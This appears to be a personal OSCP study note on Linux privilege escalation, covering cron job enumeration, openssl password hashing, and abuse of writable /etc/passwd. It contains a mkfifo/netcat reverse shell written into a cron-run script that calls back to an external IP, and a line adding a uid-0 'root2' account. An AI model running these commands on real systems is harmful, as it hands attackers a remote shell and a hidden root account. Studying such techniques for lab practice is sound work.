---
aliases:
  - File Permissions and Password Authentication
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - linux
  - enumeration
  - enum
  - automated
  - privesc
  - privilege_escalation
  - file_permission
  - insecure_file_permission
  - password_authentication
  - password
  - authentication
author: Mehdi N Tehrani
creat_date: 2024-01-01
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Cron
#cron #running_cron #crontab
## Running jobs
```
crontab -l       # for current user
sudo crontab -l  # for root user

ls -lahr /etc/cron* 
cat /etc/crontab
```
## Log
check cron log for running cron jobs
```
grep 'CRON' /var/log/syslog
```

#mkfifo #revshell #reverse_shell 
```
echo -e '#!/bin/bash\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.216 7777 >/tmp/f' > user_backups.sh
```

# Password Authentication
#password #authentication #openssl #passwd #openssl_passwd
#crypt_algorithm #crypt #algorithm #md5 #sha256 #sha512 #md5_apache #apache
```
openssl passwd <password>

open passwd -salt <salt> -6 <password>
                          ^ algorithm: SHA512
                          ^ -5: SHA256
                          ^ -1: MD5
```
Examples:
```
$ openssl passwd -salt mysalt -1 mypass         # MD5
$1$mysalt$VdaCBUuBtLP.kQzAvdCTs/

$ openssl passwd -salt mysalt -apr1 mypass      # MD5 apache variant
$apr1$mysalt$01i53OOxVHjj71EktTIla1

$ openssl passwd -salt mysalt -5 mypass         # SHA256
$5$mysalt$Mj3PEQvKx3o5EGyen2YBELSMsvC2YrThWJT3KeCZdl0

$ openssl passwd -salt mysalt -6 mypass         # SHA512
$6$mysalt$hfk3rJdQ6OHfGsqZ./zZwSr4I0ax2/tCLLtWjXZYu6kK7mV2rdUL3/K3OAn2ZBkFGuOdkaMlsBSj7zGC6WeY.0
```


## Exploit /etc/passwd
```sh
echo "username:<passhash>:<uid>:<gid>:<group_name>:<home_dir_path>:<shell>"

# example
echo "root2:$1$mysalt$VdaCBUuBtLP.kQzAvdCTs/:0:0:root:/root:/bin/bash"
```
